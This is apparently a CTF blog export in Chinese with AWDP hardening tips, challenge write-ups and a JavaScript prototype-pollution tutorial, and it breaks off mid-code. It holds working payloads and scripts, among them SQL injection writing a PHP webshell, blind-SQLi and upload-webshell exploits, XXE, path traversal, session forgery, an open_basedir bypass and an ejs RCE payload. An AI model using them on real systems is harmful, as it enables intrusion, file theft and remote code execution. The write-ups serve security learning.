转义法转义法就是将我们输入的值进行转义处理，让引号之类的特殊符号被当做输入内容，从而防止引号的恶意闭合导致sql注入。php中常见的转义函数如下： 123addslashes() 全版本通用mysql_real_escape_string() 在php5.5中已经弃用，并在php7中被删除mysql_escape_string() PHP 4 &gt;= 4.0.3, PHP 5 过滤法过滤法，也就是设置黑名单，阻止一些恶意语句的传入。当后端程序检测到输入的内容存在黑名单中时，即立刻终止程序，从而起到防御的作用。 常用waf： 1234if(preg_match(&quot;/xml|extractvalue|regexp|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|select|union|flag|ascii|subm|right|\\&#x27;|\\^|\\||\\ /i&quot;,$username))&#123; die(&quot;no&quot;);&#125;//使用preg_replace也可，具体要看攻击的exp或payload形式 XSS攻击对于XSS攻击的防守主要还是以过滤为主。对于XSS攻击最好的过滤方式还得是过滤&lt;、script、&gt;、&quot;、/等等敏感字符，以防止各种各样奇怪的绕过方法： 1234if(preg_match(&quot;/script|\\&lt;|\\&gt;|\\/|\\\\|\\&quot;|document|console|alert|src|xml|\\+|_|data|cookie|flag|var/i&quot;,$username))&#123; die(&quot;no&quot;);&#125;//使用preg_replace也可，具体要看攻击的exp或payload形式 DVWA中对于XSS攻击的防御采取了设置token的方法。其实我们也可以通过编码转化来进行防御，对输入的值进行一次base64解码等方式来进行防御也是一种可行的策略。 任意文件包含/读取存在这类目录很多都是因为没有对输入的值进行控制，导致在引用或者读取文件时被攻击者以相对路径或者伪协议的方式直接读取到了文件。因此此类漏洞无脑过滤.、/和伪协议就可以了： 1234if(preg_match(&quot;/data|ph|file|\\:|\\/|\\.|\\+|flag|phar/i&quot;,$username))&#123; die(&quot;no&quot;);&#125;//使用preg_replace也可，具体要看攻击的exp或payload形式 DVWA中针对此类漏洞做出了无懈可击的防御——白名单机制。或者还有一种思路是控制输出内容，但是不知道这种思路在awdp中能不能实现。 Upload关于文件上传就有很多值得说到的东西了，前端的MINE，后端的waf都是进行防御的有效手段。不过必须要注意的是图片码的防御，不能让.htacess文件和.user.ini文件被上传，并且一定要对图片进行二次渲染，杀死藏匿于图片中的木马。 关于waf，除了常规的后缀黑名单与白名单，更重要的是对上传文件内容的过滤，对于各种一句话木马bypass是绝对不能姑息的。同样，对于文件路径的保护也是防止文件上传漏洞发生的重要手段。 最后一种方法便是设置权限，upload文件夹下的文件取消执行权限，这样可以使上传的脚本不能够被执行。 总之，关于upload漏洞的防护加固方式是多样的，我们可以根据exp进行重点针对。 总结上面几个漏洞的加固都是常规的php漏洞，还是比较简单的，打打分区赛暂时还行，不像总决赛什么加固都有，python、java一个不漏。 Ezsql打开网页发现是一个登录框，测试sql万能密码发现登陆成功： 1admin&#x27; or 1=1# 那么连接ssh，进入/var/www/html目录，查看index.php文件： 123456789101112131415161718&lt;?phperror_reporting(0);include &#x27;dbConnect.php&#x27;;$username = $_GET[&#x27;username&#x27;];$password = $_GET[&#x27;password&#x27;];if (isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123; $sql = &quot;SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;; $result = $mysqli-&gt;query($sql); if (!$result) die(mysqli_error($mysqli)); $data = $result-&gt;fetch_all(); // 从结果集中获取所有数据 if (!empty($data)) &#123; echo &#x27;登录成功！&#x27;; &#125; else &#123; echo &quot;用户名或密码错误&quot;; &#125;&#125;?&gt; 一点过滤都没有，那么我们只用转义法进行加固： 12$username = addslashes($username);$password = addslashes($password); 加固后返回测试，发现登录失败，那么我们进行check，返回true，在/flag中获取flag。 [网鼎杯 2020 半决赛]faka这题没在加固题中，但是当时网鼎杯半决赛也是awdp，因此直接拿来做。 首先打一下这个题，查看源码，发现一个sql文件，源码中发现admin路由，发现需要登录。因此查看数据表内容，在system_user找到用户密码的md5值，用somd5解密，密码为admincccbbb123。 登录后台成功后，去源码中搜关键函数，在/manage/controller/Backup.php`中发现文件读取： 1234567891011121314151617181920212223function downloadBak() &#123; $file_name = $_GET[&#x27;file&#x27;]; $file_dir = $this-&gt;config[&#x27;path&#x27;]; if (!file_exists($file_dir . &quot;/&quot; . $file_name)) &#123; //检查文件是否存在 return false; exit; &#125; else &#123; $file = fopen($file_dir . &quot;/&quot; . $file_name, &quot;r&quot;); // 打开文件 // 输入文件标签 header(&#x27;Content-Encoding: none&#x27;); header(&quot;Content-type: application/octet-stream&quot;); header(&quot;Accept-Ranges: bytes&quot;); header(&quot;Accept-Length: &quot; . filesize($file_dir . &quot;/&quot; . $file_name)); header(&#x27;Content-Transfer-Encoding: binary&#x27;); header(&quot;Content-Disposition: attachment; filename=&quot; . $file_name); //以真实文件名提供给浏览器下载 header(&#x27;Pragma: no-cache&#x27;); header(&#x27;Expires: 0&#x27;); //输出文件内容 echo fread($file, filesize($file_dir . &quot;/&quot; . $file_name)); fclose($file); exit; &#125; &#125; 没有过滤，那么我们直接构建payload： 1/manage/backup/downloadbak?file=../../../../../../../../../../flag.txt 获取flag。 其实看了别人的wp，发现还有文件上传漏洞可以利用，但是那个利用十分复杂，这里就不多讲了。主要讲一下加固，其实也很简单，过滤..和../就可以了。 加固代码如下： 123456789101112131415161718192021222324252627function downloadBak() &#123; $file_name = $_GET[&#x27;file&#x27;]; $waf = array(&quot;..&quot;,&quot;../&quot;); if(in_array($file, $waf))&#123; die(&quot;impossible&quot;); &#125; $file_dir = $this-&gt;config[&#x27;path&#x27;]; if (!file_exists($file_dir . &quot;/&quot; . $file_name)) &#123; //检查文件是否存在 return false; exit; &#125; else &#123; $file = fopen($file_dir . &quot;/&quot; . $file_name, &quot;r&quot;); // 打开文件 // 输入文件标签 header(&#x27;Content-Encoding: none&#x27;); header(&quot;Content-type: application/octet-stream&quot;); header(&quot;Accept-Ranges: bytes&quot;); header(&quot;Accept-Length: &quot; . filesize($file_dir . &quot;/&quot; . $file_name)); header(&#x27;Content-Transfer-Encoding: binary&#x27;); header(&quot;Content-Disposition: attachment; filename=&quot; . $file_name); //以真实文件名提供给浏览器下载 header(&#x27;Pragma: no-cache&#x27;); header(&#x27;Expires: 0&#x27;); //输出文件内容 echo fread($file, filesize($file_dir . &quot;/&quot; . $file_name)); fclose($file); exit; &#125; &#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -加固","slug":"web-加固","permalink":"http://example.com/tags/web-%E5%8A%A0%E5%9B%BA/"}]},{"title":"buu练习9","slug":"buu练习9","date":"2022-05-28T06:04:59.000Z","updated":"2022-05-28T09:20:58.913Z","comments":true,"path":"2022/05/28/buu练习9/","link":"","permalink":"http://example.com/2022/05/28/buu%E7%BB%83%E4%B9%A09/","excerpt":"前言 国B打完打国A，也有一个多月没刷buu了，刷刷题练练手感。","text":"前言 国B打完打国A，也有一个多月没刷buu了，刷刷题练练手感。 [SUCTF 2018]MultiSQL进入网页，是一个测试系统，但是只有注册和登录可以点击，先随便注册一个账号登录试试。 登录成功后又多了两个可操作点：用户信息和编辑头像。这题看起来可以利用的点多的不行。首先我们进入用户信息，发现url存在可疑注入点，当id为2时为自己注册的账户，id为1时为管理员账户，id为3以后则不存在账户。 id参数测试也存在一堆注入，但是过滤拉满，select也是被过滤了。这时候就要用到Mysql的预处理机制来进行写入文件了，我们通过文件上传功能发现绝对路径，因此可以写入webshell进行getshell。 关于Mysql预处理的基本知识：MySQL的预处理技术 由于select被过滤，因此使用char()来绕过waf。 exp： 12345678910str=&quot;select &#x27;&lt;?php eval($_POST[_]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;len_str=len(str)for i in range(0,len_str): if i == 0: print(&#x27;char(%s&#x27;%ord(str[i]),end=&quot;&quot;) else: print(&#x27;,%s&#x27;%ord(str[i]),end=&quot;&quot;)print(&#x27;)&#x27;)//char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59) payload： 1?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query; 文件上传成功，到./favicon/shell.php执行命令，获取flag： 1_=system(&#x27;cat /WelL_Th1s_14_fl4g &#x27;); [SWPU2019]Web4进入网站又是个登录框，但这次不给注册了，那不出意外应该还是存在sql注入。抓包发现username和password是以json格式上传的，且在闭合单引号时出现报错，加入注释符回显正常，因此确定存在sql注入。 经测试发现select又被过滤了，且依然存在堆叠注入，那有没有一种可能，这里的解法和上一道题是类似的呢？当然，这里我们使用时间盲注对数据库进行注入，exp： 123456789101112131415161718192021222324252627import requestsimport jsonimport timedef main(): url = &#x27;&#x27;&#x27;http://5fddb488-a40c-4017-b042-7f84300dfca9.node4.buuoj.cn:81&#x27;&#x27;&#x27; payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot; flag = &#x27;&#x27; for i in range(1,30): payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; for j in range(0,128): datas = &#123;&#x27;username&#x27;:payloads.format(str_to_hex(payload.format(i,j))),&#x27;password&#x27;:&#x27;123456&#x27;&#125; data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times &gt;= 3: flag = flag + chr(j) print(flag) breakdef str_to_hex(s): return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])if __name__ == &#x27;__main__&#x27;: main()//glzjin_wants_a_girl_friend.zip 压缩包下载下来是源码，发现是一个框架，根目录下有flag.php文件，但是无法看到flag，推断是要我们进行文件包含或文件读取。因此审计代码： 12345678910111213141516171819202122232425262728293031//userIndex.phpfunction imgToBase64($img_file) &#123; $img_base64 = &#x27;&#x27;; if (file_exists($img_file)) &#123; $app_img_file = $img_file; // 图片路径 $img_info = getimagesize($app_img_file); // 取得图片的大小，类型等 $fp = fopen($app_img_file, &quot;r&quot;); // 图片是否可读权限 if ($fp) &#123; $filesize = filesize($app_img_file); $content = fread($fp, $filesize); $file_content = chunk_split(base64_encode($content)); // base64编码 switch ($img_info[2]) &#123; //判读图片类型 case 1: $img_type = &quot;gif&quot;; break; case 2: $img_type = &quot;jpg&quot;; break; case 3: $img_type = &quot;png&quot;; break; &#125; $img_base64 = &#x27;data:image/&#x27; . $img_type . &#x27;;base64,&#x27; . $file_content;//合成图片的base64编码 &#125; fclose($fp); &#125; return $img_base64; //返回图片的base64&#125; 我们发现在这个文件中可以通过读取$img_file的内容来输出对应的base64编码，存在文件读取，那么我们要怎么调用到这个文件呢： 1234567891011121314151617181920212223//UserController.php&lt;?php /*** 用户控制器*/class UserController extends BaseController&#123; // 访问列表 public function actionList() &#123; $params = $_REQUEST; $userModel = new UserModel(); $listData = $userModel-&gt;getPageList($params); $this-&gt;loadView(&#x27;userList&#x27;, $listData ); &#125; public function actionIndex() &#123; $listData = $_REQUEST; $this-&gt;loadView(&#x27;userIndex&#x27;,$listData); &#125;&#125; 这个文件直接可以加载userIndex，那么我们根据框架的规则，就可以抓包读取了，payload： 1/index.php?r=User/Index&amp;img_file=/../flag.php base64转码后即为flag。 [CISCN2019 华东南赛区]Web4进入网页只有一行字，让我们read something，点击后跳转到百度。观察url发现存在url参数，尝试任意文件读取发现读取成功，但是存在过滤，例如file、flag等被过滤了。 回到/read审查元素发现存在session，那么我们解读一下： 1&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125; 看来我们需要把这里的www-data改为什么东西，但是要伪造session我们需要secret_key，我们需要找到它。因此尝试读取其他常用目录，例如/proc/self/environ： 1LANG=C.UTF-8SHELL=/bin/ashSHLVL=1WERKZEUG_RUN_MAIN=trueCHARSET=UTF-8PWD=/appWERKZEUG_SERVER_FD=3LOGNAME=glzjinUSER=glzjinHOME=/appPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPS1=\\h:\\w\\$ PAGER=less 存在这个文件说明应该要有/app/app.py，读取： 12345678910111213141516171819202122232425262728293031323334353637383940# encoding:utf-8import re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)app.debug = True@app.route(&#x27;/&#x27;)def index(): session[&#x27;username&#x27;] = &#x27;www-data&#x27; return &#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;@app.route(&#x27;/read&#x27;)def read(): try: url = request.args.get(&#x27;url&#x27;) m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE) n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE) if m or n: return &#x27;No Hack&#x27; res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return &#x27;no response&#x27;@app.route(&#x27;/flag&#x27;)def flag(): if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;: return open(&#x27;/flag.txt&#x27;).read() else: return &#x27;Access denied&#x27;if __name__==&#x27;__main__&#x27;: app.run( debug=True, host=&quot;0.0.0.0&quot; ) 我们发现需要将session中的www-data改为fuck就可以在/flag路由下读取flag了。而key的获取方式我们也知晓了，为了知道uuid.getnode，我们需要读取/sys/class/net/eth0/address： 17e:cd:10:29:44:9e 之后我们按照key的生成方式获取key： 1234567891011121314import uuidimport randommac = &quot;7e:cd:10:29:44:9e&quot;temp = mac.split(&#x27;:&#x27;)temp = [int(i,16) for i in temp]temp = [bin(i).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in temp]temp = &#x27;&#x27;.join(temp)mac = int(temp,2)random.seed(mac)randStr = str(random.random()*233)print(randStr)//177.20043364003038取小数点后八位 用工具生成新的session： 1eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.YpHWiA.-RTAvCwEbs--FjJNrtxS3Rb5Uko 在/flag下更改session读取flag即可。 [BSidesCF 2019]SVGMagic进入网页只有一个文件上传功能，不过大大的SVG就写在最上面。我们知道SVG是用XML定义的。其实想到这里这题的大致解法就出来了，利用SVG的XML来进行XEE读取flag即可，payload： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt; &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; flag以图片形式呈现。 [SUCTF 2019]EasyWeb来道代码审计压压惊： 1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) ) die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; 看源码解题思路挺明确的，通过eval()调用get_the_flag()来获取flag，不过上来的waf可不少啊。不过问题不大，异或绕过经典操作就可绕过去了： 12?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag 接着我们来看下get_the_flag()，过滤了ph和&lt;?，并且对图片hex正确性进行了验证，看来这个木马只能上传图片码了。 根据phpinfo内容，服务器为Apache，因此选择上传.htacess文件，不过以前写的这个文件在这里就不好用了，因为要绕过对内容的过滤，因此这里选择将文件内容进行base64编码（我看别人wp用的是utf-16，那样的话.htacess文件就不用改了）。 .htacess： 1234#define width 1000#define height 1000 AddType application/x-httpd-php .pccphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_48cd8b43081896fbd0931d204f947663/mrl64.pcc&quot; exp: 12345678910111213141516171819202122232425import requestsimport base64url = &quot;http://f9432b6f-408f-485b-9cee-636af7ed9743.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;htaccess = b&quot;&quot;&quot;#define width 1000#define height 1000 AddType application/x-httpd-php .pccphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_c47b21fcf8f0bc8b3920541abd8024fd/mrl64.pcc&quot;&quot;&quot;&quot;shell = b&quot;GIF89aaa&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;mrl64&#x27;]);?&gt;&quot;)files = &#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;response = requests.post(url=url,files=files)print(response.text)files = &#123;&#x27;file&#x27;:(&#x27;mrl64.pcc&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;response = requests.post(url=url,files=files)print(response.text) 文件上传成功，但是没法直接连接，查看phpinfo发现存在open_basedir，因此我们无法访问根目录，这里用到bypass open_basedir的那个方法： 123?mrl64=chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(&#x27;/&#x27;));?mrl64=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;)); [SUCTF 2018]annonymous最后来做个代码审计： 12345678910111213 &lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&#x27;func_name&#x27;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125;show_source(__FILE__); 代码很短，逻辑也很简单，$MY的作用就是读取flag，而$hash则是创造了一个随机数。我们都知道create_function()创造的是一个匿名函数，但其实这个函数是有名字的，名字是%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)。 而想要在eval()中调用$MY，就必须要得到这个函数的名字，不过这范围也就1000，直接爆破就好了。 exp： 12345678import requestsfor i in range(1000): url = &#x27;http://72f0e300-53fa-406e-9d94-de55324bdbd1.node4.buuoj.cn:81/?func_name=%00lambda_&#123;&#125;&#x27;.format(i) r = requests.get(url) if &#x27;flag&#x27; in r.text: print(r.text) break 运行exp获得flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"js的原型链污染","slug":"js的原型链污染","date":"2022-05-26T08:06:53.000Z","updated":"2022-05-26T13:35:13.228Z","comments":true,"path":"2022/05/26/js的原型链污染/","link":"","permalink":"http://example.com/2022/05/26/js%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"前言 ISCC结束前几天就开始看原型链这一块了，为了填上之前那篇博客的坑还是啃了一会的，因为没有很系统了解过js因此理解起来不是特别顺利。","text":"前言 ISCC结束前几天就开始看原型链这一块了，为了填上之前那篇博客的坑还是啃了一会的，因为没有很系统了解过js因此理解起来不是特别顺利。 继承与原型链我们都知道js是面向对象的编程语言，因此js有很多骚操作是别的编程语言没有的。而js是动态的，本身不提供一个class的实现。即便是在ES2015/ES6中引入了class关键字，但那也只是语法糖，js仍然是基于原型的。 js中只有一种结构：对象（object）。每个obj都有一个私有属性（__proto__）指向它的构造函数的原型链对象（prototype）。然后这个原型对象也有一个自己的原型对象，这样层层向上知道NULL。那么根据原型链定义，NULL就是原型链中最后一个环节。 接下来我们来分析下什么是prototype和__proto__。 js中我们如果想要定义一个类，需要以定义函数的方式来实现： 12345678function Foo() &#123; this.bar = 1 this.show = function() &#123; console.log(this.bar) &#125;&#125;(new Foo()).show() 这样写确实可以实现，但是会产生一个问题，就是每新建一个Foo对象，this.show = function()…就会执行一次，因为show方法实际上还是绑定在对象上，而并非“类”。 如果我希望创建类时只创建一次show方法，我们就需要用到prototype： 123456789101112function Foo() &#123; this.bar = 1&#125;Foo.prototype.show = function show() &#123; console.log(this.bar)&#125;let foo = new Foo()foo.show()//1 我们可以认为原型prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。 我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。这时候，就该__proto__登场了: 12foo.__proto__ == Foo.prototype//true 基于js原型链的继承js的继承机制利用的是类对象实例化时拥有prototype中的属性与方法，p牛在他的文章中用一个生动形象的例子向我们展示了这个机制： 123456789101112131415function Father() &#123; this.first_name = &#x27;Donald&#x27; this.last_name = &#x27;Trump&#x27;&#125;function Son() &#123; this.first_name = &#x27;Melania&#x27;&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)//Name: Melania Trump 很明显可以看出来，Son类继承了Father类中last_name的属性，整个操作过程是这样的： 在对象Son中寻找last_name 如果找不到，就在son.__proto__中寻找last_name 就这样一层一层往上寻找，直到找到last_name或NULL结束 123son.__proto__//Object &#123; first_name: &quot;Donald&quot;, last_name: &quot;Trump&quot; &#125; 这个查找机制被称为prototype继承连。 js原型链污染什么是原型链污染结合之前所介绍的，我们不禁发出疑问，如果我们修改了foo.__proto__中的值，那么会不会改变Foo类呢？带着这个疑问，我们来进行测试： 12345678910let foo = &#123;mrl64: 1&#125;console.log(foo.mrl64)foo.__proto__.mrl64 = 2console.log(foo.mrl64)let sp = &#123;&#125;console.log(sp.mrl64)//1 1 2 我们发现最后一个sp是一个空对象，但是输出sp.mrl64的结果是2，这正是由于修改了foo的原型foo.proto.mrl64这个obj类，给这个类增加了一个属性mrl64，值为2。而在这之后，我们用obj类创建了一个sp对象，因此sp对象中自然会有一个sp属性。 在应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象，这种攻击方式就是原型链污染。 什么情况下会存在原型链污染这就涉及到在哪些情况下我们可以设置__proto__的值了，其实可以控制数组键名的操作就可以做到，例如： 对象merge 对象clone（将待操作的对象merge到一个空对象中） merge函数： 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; 看到最后一个赋值语句我们不禁就来了想法了，如果这个key的名称就是__proto__，是不是就可以触发原型链污染了？我们同样试验一下： 123456789let test1 = &#123;&#125;let test2 = &#123;a&quot;1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;merge(test1,test2)console.log(test1.a, test1.b)test3 = &#123;&#125;console.log(test3.b)//1 2 &#123;&#125; 可以发现合并成功，但是原型链污染失败。这是因为我们用js创建test2的过程中，__proto__已经代表test2的原型了，此时遍历test2的键名__protp__并不是一个key，因此不会修改obj原型。 那么该怎么进行处理呢，我们来康康这个代码： 123456789let test1 = &#123;&#125;let test2 = JSON.parse&#123;&#x27;&#123;a&quot;1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;&#x27;&#125;merge(test1,test2)console.log(test1.a, test1.b)test3 = &#123;&#125;console.log(test3.b)//1 2 2 这次原型链被成功污染了，这是因为JSON解析下，__proto__被认为是真正的键名而并非原型。marge操作极其容易存在原型链污染，多个常见库中都存在这个问题。 [GYCTF2020]Ez_Express进入网页是个login页面，提示我们要注册，用户名只支持大写且需要使用ADMIN登录，但是注册页面又啥都没有。 怀疑存在信息搜集，测试发现存在www.zip，下载后审计源码： 12345678910111213141516171819202122232425//login部分router.post(&#x27;/login&#x27;, function (req, res) &#123; if(req.body.Submit==&quot;register&quot;)&#123; if(safeKeyword(req.body.userid))&#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user=&#123; &#x27;user&#x27;:req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;:false &#125; res.redirect(&#x27;/&#x27;); &#125; else if(req.body.Submit==&quot;login&quot;)&#123; if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;); 可以发现使用了toUpperCase()，那就是一个经典trick了，登录账号输入admın然后点击注册，这次出现页面了。有一个输入框，问我们最喜欢的语言，随便填都会alert一个success，那我们继续审计： 123456//action部分router.post(&#x27;/action&#x27;, function (req, res) &#123; if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125;); 我们在这里看到了clone函数： 1234567891011121314151617181920const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined&#125; 看到这两个函数相信应该就能反应过来要使用原型链污染了，结合题目的名字，不难想到利用ejs来进行RCE，尤其是代码中显眼的不行的outputFunctionName： 123router.get(&#x27;/info&#x27;, function (req, res) &#123; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;) 具体原理可以参考下这篇文章：Express+lodash+ejs: 从原型链污染到RCE 那么我们构建payload： 123Content-Type: application/json&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125; 接着访问/info即可获取flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-js -web","slug":"js-web","permalink":"http://example.com/tags/js-web/"}]},{"title":"【ISCC2022】write up(web+misc)","slug":"【ISCC2022】write-up-web-misc","date":"2022-05-26T04:07:09.000Z","updated":"2022-05-26T11:32:37.915Z","comments":true,"path":"2022/05/26/【ISCC2022】write-up-web-misc/","link":"","permalink":"http://example.com/2022/05/26/%E3%80%90ISCC2022%E3%80%91write-up-web-misc/","excerpt":"前言 终于打完了ISCC，由于是赛后写的因此没有复现环境，所以就简单写写wp了。","text":"前言 终于打完了ISCC，由于是赛后写的因此没有复现环境，所以就简单写写wp了。 WEB冬奥会源码： 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$Step1=False;$Step2=False;$info=(array)json_decode(@$_GET[&#x27;Information&#x27;]);if(is_array($info))&#123; var_dump($info); is_numeric(@$info[&quot;year&quot;])?die(&quot;Sorry~&quot;):NULL; if(@$info[&quot;year&quot;])&#123; (@$info[&quot;year&quot;]=2022)?$Step1=True:NULL; &#125; if(is_array(@$info[&quot;items&quot;]))&#123; if(!is_array($info[&quot;items&quot;][1])OR count($info[&quot;items&quot;])!=3) die(&quot;Sorry~&quot;); $status = array_search(&quot;skiing&quot;, $info[&quot;items&quot;]); $status===false?die(&quot;Sorry~&quot;):NULL; foreach($info[&quot;items&quot;] as $key=&gt;$val)&#123; 